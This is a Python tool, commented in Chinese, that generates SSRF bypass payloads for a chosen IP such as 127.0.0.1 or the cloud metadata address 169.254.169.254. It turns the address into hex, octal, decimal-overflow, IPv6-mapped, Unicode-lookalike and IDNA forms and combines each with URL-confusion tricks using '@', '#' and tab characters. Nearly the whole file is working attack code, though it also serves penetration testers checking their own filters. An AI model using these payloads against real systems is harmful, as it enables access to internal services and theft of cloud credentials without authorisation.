# @Author: Gelcon.
# @Date: 2023/3/8 15:29

"""
本文件包含了诸多变异方法
使用方法：
python ip.py 169.254.169.254 80 www.google.com
python ip.py 127.0.0.1 80 www.google.com

2023年3月12日17:14:48
提供了向外生成Payload的接口以及生成txt格式的Payload的功能
"""

from __future__ import print_function

import logging
from random import *
from io import open
import datetime
import string
import sys
import platform
import random

UnicodeLove = {
    '0': ['⓪', '０', '𝟎', '𝟘', '𝟢', '𝟬', '𝟶', '⁰', '₀'],
    '1': ['①', '１', '𝟏', '𝟙', '𝟣', '𝟭', '𝟷', '¹', '₁'],
    '2': ['②', '２', '𝟐', '𝟚', '𝟤', '𝟮', '𝟸', '²', '₂'],
    '3': ['③', '３', '𝟑', '𝟛', '𝟥', '𝟯', '𝟹', '³', '₃'],
    '4': ['④', '４', '𝟒', '𝟜', '𝟦', '𝟰', '𝟺', '⁴', '₄'],
    '5': ['⑤', '５', '𝟓', '𝟝', '𝟧', '𝟱', '𝟻', '⁵', '₅'],
    '6': ['⑥', '６', '𝟔', '𝟞', '𝟨', '𝟲', '𝟼', '⁶', '₆'],
    '7': ['⑦', '７', '𝟕', '𝟟', '𝟩', '𝟳', '𝟽', '⁷', '₇'],
    '8': ['⑧', '８', '𝟖', '𝟠', '𝟪', '𝟴', '𝟾', '⁸', '₈'],
    '9': ['⑨', '９', '𝟗', '𝟡', '𝟫', '𝟵', '𝟿', '⁹', '₉'],
    '10': ['⑩'],
    '11': ['⑪'],
    '12': ['⑫'],
    '13': ['⑬'],
    '14': ['⑭'],
    '15': ['⑮'],
    '16': ['⑯'],
    '17': ['⑰'],
    '18': ['⑱'],
    '19': ['⑲'],
    '20': ['⑳'],
    '.': ['。', '｡', '．'],
    'a': ['ａ', '𝐚', '𝑎', '𝒂', '𝒶', '𝓪', '𝔞', '𝕒', '𝖆', '𝖺', '𝗮', '𝘢', '𝙖', '𝚊', 'ⓐ', 'Ａ', '𝐀', '𝐴', '𝑨',
          '𝒜', '𝓐', '𝔄', '𝔸', '𝕬', '𝖠', '𝗔', '𝘈', '𝘼', '𝙰', 'Ⓐ', 'ª', 'ᵃ', 'ₐ', 'ᴬ', '🄰'],
    'b': ['ｂ', '𝐛', '𝑏', '𝒃', '𝒷', '𝓫', '𝔟', '𝕓', '𝖇', '𝖻', '𝗯', '𝘣', '𝙗', '𝚋', 'ⓑ', 'Ｂ', 'ℬ', '𝐁', '𝐵',
          '𝑩', '𝓑', '𝔅', '𝔹', '𝕭', '𝖡', '𝗕', '𝘉', '𝘽', '𝙱', 'Ⓑ', 'ᵇ', 'ᴮ', '🄱'],
    'c': ['ｃ', 'ⅽ', '𝐜', '𝑐', '𝒄', '𝒸', '𝓬', '𝔠', '𝕔', '𝖈', '𝖼', '𝗰', '𝘤', '𝙘', '𝚌', 'ⓒ', 'Ｃ', 'Ⅽ', 'ℂ',
          'ℭ', '𝐂', '𝐶', '𝑪', '𝒞', '𝓒', '𝕮', '𝖢', '𝗖', '𝘊', '𝘾', '𝙲', 'Ⓒ', '🄫', 'ᶜ', '🄲'],
    'd': ['ｄ', 'ⅾ', 'ⅆ', '𝐝', '𝑑', '𝒅', '𝒹', '𝓭', '𝔡', '𝕕', '𝖉', '𝖽', '𝗱', '𝘥', '𝙙', '𝚍', 'ⓓ', 'Ｄ', 'Ⅾ',
          'ⅅ', '𝐃', '𝐷', '𝑫', '𝒟', '𝓓', '𝔇', '𝔻', '𝕯', '𝖣', '𝗗', '𝘋', '𝘿', '𝙳', 'Ⓓ', 'ᵈ', 'ᴰ', '🄳'],
    'e': ['ｅ', 'ℯ', 'ⅇ', '𝐞', '𝑒', '𝒆', '𝓮', '𝔢', '𝕖', '𝖊', '𝖾', '𝗲', '𝘦', '𝙚', '𝚎', 'ⓔ', 'Ｅ', 'ℰ', '𝐄',
          '𝐸', '𝑬', '𝓔', '𝔈', '𝔼', '𝕰', '𝖤', '𝗘', '𝘌', '𝙀', '𝙴', 'Ⓔ', 'ᵉ', 'ₑ', 'ᴱ', '🄴'],
    'f': ['ｆ', '𝐟', '𝑓', '𝒇', '𝒻', '𝓯', '𝔣', '𝕗', '𝖋', '𝖿', '𝗳', '𝘧', '𝙛', '𝚏', 'ⓕ', 'Ｆ', 'ℱ', '𝐅', '𝐹',
          '𝑭', '𝓕', '𝔉', '𝔽', '𝕱', '𝖥', '𝗙', '𝘍', '𝙁', '𝙵', 'Ⓕ', 'ᶠ', '🄵'],
    'x': ['ｘ', 'ⅹ', '𝐱', '𝑥', '𝒙', '𝓍', '𝔁', '𝔵', '𝕩', '𝖝', '𝗑', '𝘅', '𝘹', '𝙭', '𝚡', 'ⓧ', 'Ｘ', 'Ⅹ', '𝐗',
          '𝑋', '𝑿', '𝒳', '𝓧', '𝔛', '𝕏', '𝖃', '𝖷', '𝗫', '𝘟', '𝙓', '𝚇', 'Ⓧ', 'ˣ', 'ₓ', '🅇'],
    # 'g': ['Ⓖ'],
    # 'h': ['Ⓗ'],
    # 'i': ['Ⓘ'],
    # 'j': ['Ⓙ'],
    # 'k': ['Ⓚ'],
    # 'l': ['Ⓛ'],
    # 'm': ['Ⓜ'],
    # 'n': ['Ⓝ'],
    # 'o': ['Ⓞ'],
    # 'p': ['Ⓟ'],
    # 'q': ['Ⓠ'],
    # 'r': ['Ⓡ'],
    # 's': ['Ⓢ'],
    # 't': ['Ⓣ'],
    # 'u': ['Ⓤ'],
    # 'v': ['Ⓥ'],
    # 'w': ['Ⓦ'],
    # 'y': ['ⓨ'],
    # 'z': ['ⓩ'],
}

# 随机的0-9之间的三个数
RANDOM3NUMBERS = str(randint(0, 9)) + str(randint(0, 9)) + str(randint(0, 9))


# 随机的由字母、数字和特殊符号组成的12-16位字符串
def random_text_spec():
    min_char = 12
    max_char = 16
    # string.ascii_letters 所有字母
    # string.digits 所有数字
    chars = string.ascii_letters + string.digits + "!$%^&*()<>:,.|\~`"
    # random.choice(): 从非空序列seq中随机选取一个元素
    # 任意生成12-16长度的随机字符串，包含ascii字母、数字、和一些符号
    return "".join(choice(chars) for x in range(randint(min_char, max_char)))


# 随机的由字母、数字组成的12-16位字符串
def random_text():
    min_char = 12
    max_char = 16
    chars = string.ascii_letters + string.digits
    return "".join(choice(chars) for x in range(randint(min_char, max_char)))


# 根据ip的位置决定乘以256的多少次方
def decimal_single(number, step):
    return int(number) * (256 ** step)


# 转换为16进制
def hex_single(number, add_0x):
    # 判断是否需要加上0X前缀
    if add_0x == "yes":
        return str(hex(int(number)))
    else:
        return str(hex(int(number))).replace("0x", "")


# 转换为8进制并且去掉o
def oct_single(number):
    return str(oct(int(number))).replace("o", "")


# 给ip地址都加上256
def dec_overflow_single(number):
    return str(int(number) + 256)


# 判断是否是有效ip
def valid_ip(address):
    parts = address.split(".")
    # ip地址由四个数值组成
    if len(parts) != 4:
        return False
    try:
        for item in parts:
            # 如果存在某个数值不在0-255之间
            if not 0 <= int(item) <= 255:
                return False
    except ValueError:
        print("\nUsage: python " + sys.argv[0] + " IP EXPORT(optional)\nUsage: python " + sys.argv[
            0] + " 169.254.169.254\nUsage: python " + sys.argv[0] + " 169.254.169.254 export")
        exit(1)
    return True


# 封闭式字符数字字符
# alphanumerics: 字母数字
def plain_2_enclosed_alphanumerics_char(s0):
    if s0 not in UnicodeLove:
        raise Exception('value not found')
    # 如果在字符集中，就随机返回字符在字符集中的一种写法
    return random.choice(UnicodeLove[s0])


# 将IP地址转换为封闭式字母数字字符
def convert_ip_2_random_unicode_value(ip):
    # ip是IP地址，分割得到4个值
    ip_parts4 = ip.split(".")
    return_ip = ""
    for x in range(0, 4):
        # 如果当前IP值是3位（IP值≥100）
        # 并且当前IP值的前两位的和小于等于20（IP值小于200）
        # 并且当前IP值大于等于10
        # 100 ≤ IP值 ≤ 209
        if len(ip_parts4[x]) == 3 \
                and (int(ip_parts4[x][0] + ip_parts4[x][1])) <= 20 \
                and (int(ip_parts4[x][0] + ip_parts4[x][1] + ip_parts4[x][2])) >= 10:
            # IP值的前两位转化为封闭字母数字字符
            return_ip = return_ip + plain_2_enclosed_alphanumerics_char(
                ip_parts4[x][0] + ip_parts4[x][1])
            # IP值的个位转换为封闭字母数字字符
            return_ip = return_ip + plain_2_enclosed_alphanumerics_char(ip_parts4[x][2])
            # 前3个IP值加上.
            if x <= 2:
                return_ip = return_ip + plain_2_enclosed_alphanumerics_char('.')
        # IP值 < 100 或 IP值 > 209
        else:
            # 直接转换IP值第一位
            return_ip = return_ip + plain_2_enclosed_alphanumerics_char(ip_parts4[x][0])
            # IP值位数≥2
            # 即10 ≤ IP值 ≤ 99 和 210 ≤ IP值 ≤ 255
            if len(ip_parts4[x]) >= 2:
                # 转换IP值第二位
                return_ip = return_ip + plain_2_enclosed_alphanumerics_char(ip_parts4[x][1])
            # 即210 ≤ IP值 ≤ 255
            if len(ip_parts4[x]) == 3:
                # 转换IP值第三位
                return_ip = return_ip + plain_2_enclosed_alphanumerics_char(ip_parts4[x][2])
            # 前3个IP值加上.
            if x <= 2:
                return_ip = return_ip + plain_2_enclosed_alphanumerics_char('.')
    return return_ip


def convert(s, recurse_chunks=True, error_on_miss=False):
    if s in UnicodeLove:
        return random.choice(UnicodeLove[s])
    # 不在字符集中，并且长度大于1
    if recurse_chunks and len(s) > 1:
        # 列表左闭右开
        # 转换最后一个以外的内容，转换最后1个内容，然后拼接
        # 此处是递归
        return convert(s[:-1]) + convert(s[-1])
    # 设置报错
    if error_on_miss:
        raise Exception('Value not found: %s' % s)
    return s


def convert_ip(ip, sep='.'):
    # convert(sep)：相当于点分割符号替换
    # 然后将其用于拼接ip
    return convert(sep).join([convert(chunk) for chunk in ip.split(sep)])


def generate_payload(ip,
                     port,
                     rand_prefix_text,
                     rand_prefix_text_spec,
                     site):
    temp = []
    temp.append(f'http://{ip}:{port}/')
    # RANDOM_PREFIX_VALID_SITE是第3个系统参数，即www.google.com
    temp.append(f'http://{ip}:{port}?@{site}/')
    temp.append(f'http://{ip}:{port}#@{site}/')
    temp.append(f'http://{site}@{ip}:{port}/')
    # RAND_PREFIX_TEXT是一段随机的由字母、数字组成的12-16位字符串
    temp.append(f'http://{rand_prefix_text}@{ip}:{port}/')
    # RAND_PREFIX_TEXT_SPEC是随机的由字母、数字和特殊符号组成的12-16位字符串
    temp.append(f'http://{rand_prefix_text_spec}@{ip}:{port}/')
    temp.append(f'http://{rand_prefix_text}@{ip}:{port}@{site}/')
    temp.append(f'http://{rand_prefix_text_spec}@{ip}:@{site}/')
    temp.append(f'http://{rand_prefix_text}@{ip}:{port}+@{site}/')
    temp.append(f'http://{rand_prefix_text_spec}@{ip}:+@{site}/')
    temp.append(f'http://{rand_prefix_text}@{site}@{ip}:{port}/')
    temp.append(f'http://{rand_prefix_text_spec}@{site}@{ip}:{port}/')
    temp.append(f'http://{ip}:{port}+&@{site}#+@{site}/')
    temp.append(f'http://{site}+&@{ip}:{port}#+@{site}/')
    temp.append(f'http://{site}+&@{site}#+@{ip}:{port}/')
    temp.append(f'http://{ip}:{port}:80/')
    temp.append(f'http://{ip}:{port}\\t{site}/')
    temp.append(f'http://{ip}:{port}%09{site}/')
    temp.append(f'http://{ip}:{port}%2509{site}/')
    temp.append(f'http://{ip}%20{site}:{port}/')
    temp.append(f'http://{site}@@{ip}:{port}/')
    temp.append(f'http://{site}@@@{ip}:{port}/')
    temp.append(f'0://{ip}:{port};{site}:80/')
    temp.append(f'http://{ip}:{port};{site}:80/')
    temp.append(f'0://{ip}:{port},{site}:80/')
    temp.append(f'http://{ip}:{port},{site}:80/')
    return temp


def generate_payload_unicode(port, ip, ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, ip8, ip14, ip9, ip10, ip11, ip12):
    temp = []
    port = str(port)
    temp.append('http://' + convert_ip_2_random_unicode_value(ip) + '/')
    temp.append('http://' + convert_ip(ip1) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip2) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip3) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip4) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip5) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip6) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip7) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip13) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip8) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip14) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip9) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip10) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip11) + ':' + port + '/')
    temp.append('http://' + convert_ip(ip12) + ':' + port + '/')
    return temp


# 生成所有Payload并返回
def all_payload(ip, port, site, export='export') -> list:
    payload = []
    if not valid_ip(ip):
        logging.error(f'{ip} is not a valid IP')
        return []
    # 分割得到4个IP值
    ip_frag3, ip_frag2, ip_frag1, ip_frag0 = ip.split(".")
    rand_prefix_text = random_text()
    rand_prefix_text_spec = random_text_spec()
    random_prefix_valid_site = site
    filename = ''
    if export == '':
        pass
    elif export == 'export':
        filename = "./result/payload/payload_origin/payload_origin_" + ip + "_" + str(datetime.datetime.now().strftime('%Y.%m.%d_%H.%M.%S')) + '.txt'
    else:
        logging.error('input export or Nothing, other words are forbidden')

    # Case 1 - Dotted hexadecimal
    print()
    print("Dotted hexadecimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 转换为16进制，并且加上了0X
    ip1 = hex_single(ip_frag3, "yes") + "." + hex_single(ip_frag2, "yes") + "." + hex_single(ip_frag1, "yes") + "." + \
          hex_single(ip_frag0, "yes")
    # 添加至当前payload列表
    payload.extend(generate_payload(ip1, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 2 - Dotless hexadecimal
    print("Dotless hexadecimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 不带点的十六进制，开头加上0X即可
    ip2 = hex_single(ip_frag3, "yes") + hex_single(ip_frag2, "no") + hex_single(ip_frag1, "no") + hex_single(ip_frag0,
                                                                                                             "no")
    payload.extend(generate_payload(ip2, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 3 - Dotless decimal
    print("Dotless decimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 将IP转换为数值
    ip3 = str(decimal_single(ip_frag3, 3) + decimal_single(ip_frag2, 2) +
              decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
    payload.extend(generate_payload(ip3, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 4 - Dotted decimal with overflow(256)
    print("Dotted decimal with overflow(256) IP Address of:" + " http://" + ip +
          " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 给ip地址都加上256
    ip4 = dec_overflow_single(ip_frag3) + "." + dec_overflow_single(ip_frag2) + "." + dec_overflow_single(
        ip_frag1) + "." + dec_overflow_single(ip_frag0)
    payload.extend(generate_payload(ip4, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 5 - Dotted octal
    print("Dotted octal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 带点的八进制
    ip5 = oct_single(ip_frag3) + "." + oct_single(ip_frag2) + "." + oct_single(ip_frag1) + "." + oct_single(ip_frag0)
    payload.extend(generate_payload(ip5, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 6 - Dotted octal with padding
    print("Dotted octal with padding IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # oct_single：转换为8进制并且去掉o
    # eg: 127.0.0.1转换为以下内容：
    # http://00177.0000.00000.000001:80/
    ip6 = '0' + oct_single(ip_frag3) + "." + '00' + oct_single(ip_frag2) + "." + \
          '000' + oct_single(ip_frag1) + "." + '0000' + oct_single(ip_frag0)
    payload.extend(generate_payload(ip6, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 7 - IPv6 compact version
    print("IPv6 compact version IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # IPv4兼容地址
    # 零压缩法可以用来缩减其长度
    # 如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示
    ip7 = '[::' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + ']'
    payload.extend(generate_payload(ip7, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 17 - IPv6 compact version with % bypass
    print("IPv6 compact version with % bypass IP Address of:" +
          " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # IPv4兼容地址
    # 加上百分号和3个随机数字
    ip13 = '[::' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + '%' + RANDOM3NUMBERS + ']'
    payload.extend(generate_payload(ip13, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 8 - IPv6 mapped version
    print("IPv6 mapped version IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # IPv4映像地址
    # 比如::ffff:192.168.89.9，是0000:0000:0000:0000:0000:ffff:c0a8:5909的简化写法
    ip8 = '[::ffff:' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + ']'
    payload.extend(generate_payload(ip8, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 16 - IPv6 mapped version with % bypass
    print("IPv6 mapped version with % bypass IP Address of:" +
          " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # IPv4映像地址
    # 加上百分号和3个随机数字
    ip14 = '[::ffff:' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + '%' + RANDOM3NUMBERS + ']'
    payload.extend(generate_payload(ip14, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
    print("Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:" +
          " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 十六进制 + 八进制 + 剩余两个IP值的数值和
    ip9 = hex_single(ip_frag3, "yes") + "." + oct_single(ip_frag2) + "." + str(
        decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
    payload.extend(generate_payload(ip9, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 10 - Dotted hexadecimal + Dotless decimal
    print("Dotted hexadecimal + Dotless decimal IP Address of:" +
          " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 十六进制 + 剩余三个IP值的数值和
    ip10 = hex_single(ip_frag3, "yes") + "." + str(
        decimal_single(ip_frag2, 2) + decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
    payload.extend(generate_payload(ip10, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 11 - Dotted octal with padding + Dotless decimal
    print("Dotted octal with padding + Dotless decimal IP Address of:" +
          " http://" + ip + " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 八进制 + 剩余三个IP值的数值和
    ip11 = '0' + oct_single(ip_frag3) + "." + \
           str(decimal_single(ip_frag2, 2) + decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
    payload.extend(generate_payload(ip11, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
    print("Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:" +
          " http://" + ip +
          " + authentication prefix/bypass combo list")
    print('======================================================================================================')
    # 八进制 + 十六进制 + 剩余两个IP值的数值和
    ip12 = '0' + oct_single(ip_frag3) + "." + hex_single(ip_frag2, "yes") + "." + str(
        decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
    payload.extend(generate_payload(ip12, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))

    # Case 13 - Abusing IDNA Standard
    print("Abusing IDNA Standard: "
          "http://ß.localdomain.pw/" + ' -> ' +
          'http://cc.localdomain.pw/' + ' => ' +
          'DNS' + ' => ' +
          '127.127.127.127')
    print('======================================================================================================')
    payload.append('http://ß.localdomain.pw/')

    # Case 14 - Abusing 。and ｡
    IPAddressParts = ip.split(".")
    print("Abusing 。and ｡ and ．: " + "http://" +
          IPAddressParts[0] + "。" + IPAddressParts[1] + "。" +
          IPAddressParts[2] + "。" + IPAddressParts[3] + "/" + " and " +
          "http://" +
          IPAddressParts[0] + "｡" + IPAddressParts[1] + "｡" +
          IPAddressParts[2] + "｡" + IPAddressParts[3] + "/" + " and " +
          "http://" +
          IPAddressParts[0] + "．" + IPAddressParts[1] + "．" +
          IPAddressParts[2] + "．" + IPAddressParts[3] + "/" + ' -> ' +
          "http://" +
          IPAddressParts[0] + "." + IPAddressParts[1] + "." +
          IPAddressParts[2] + "." + IPAddressParts[3] + "/")
    print('======================================================================================================')
    # 点分割符号替换
    payload.append('http://' +
                   IPAddressParts[0] + '。' + IPAddressParts[1] + '。' +
                   IPAddressParts[2] + '。' + IPAddressParts[3] + '/')
    payload.append('http://' +
                   IPAddressParts[0] + '｡' + IPAddressParts[1] + '｡' +
                   IPAddressParts[2] + '｡' + IPAddressParts[3] + '/')
    payload.append('http://' +
                   IPAddressParts[0] + '．' + IPAddressParts[1] + '．' +
                   IPAddressParts[2] + '．' + IPAddressParts[3] + '/')
    print('======================================================================================================')
    print()

    # Case 15 Abusing Unicode
    print("Abusing Unicode:" + 'http://' + convert_ip_2_random_unicode_value(ip) + '        -> ' + "http://" + ip)
    print('======================================================================================================')
    # 封闭式字母数字字符
    payload.extend(
        generate_payload_unicode(port, ip, ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, ip8, ip14, ip9, ip10, ip11, ip12))

    if export == 'export':
        python_version = (platform.python_version())
        major, minor, patch_level = python_version.split(".")
        # Python3
        if major == "3":
            with open(filename, 'w', encoding='utf8') as f:
                for p in payload:
                    f.write(p + '\n')
        else:
            with open(filename, 'wb', encoding='utf8') as f:
                for p in payload:
                    f.write(p + '\n')
        print("Results are exported to: " + filename, sep='')
        print("\n" + '-----------------------------------------------------------------------------------------------')
    print()
    return payload


# 测试使用
# def all_payload(ip, port, site, export='export') -> list:
#     res = ['http://127.0.0.1', 'http://0x7f.0x0.0x0.0x1:80/', 'http://0x7f.0x0.0x0.0x1:80?@www.google.com/',
#            'http://0x7f.0x0.0x0.0x1:80#@www.google.com/', 'http://www.google.com@0x7f.0x0.0x0.0x1:80/',
#            'http://dhrQNXi1LqQ61@0x7f.0x0.0x0.0x1:80/', 'http://)rEg(7G7$4Wmws$0@0x7f.0x0.0x0.0x1:80/',
#            'http://dhrQNXi1LqQ61@0x7f.0x0.0x0.0x1:80@www.google.com/',
#            'http://)rEg(7G7$4Wmws$0@0x7f.0x0.0x0.0x1:@www.google.com/',
#            'http://dhrQNXi1LqQ61@0x7f.0x0.0x0.0x1:80+@www.google.com/']
#     return res


if __name__ == '__main__':
    print(all_payload('127.0.0.1', 80, 'www.google.com', 'export'))
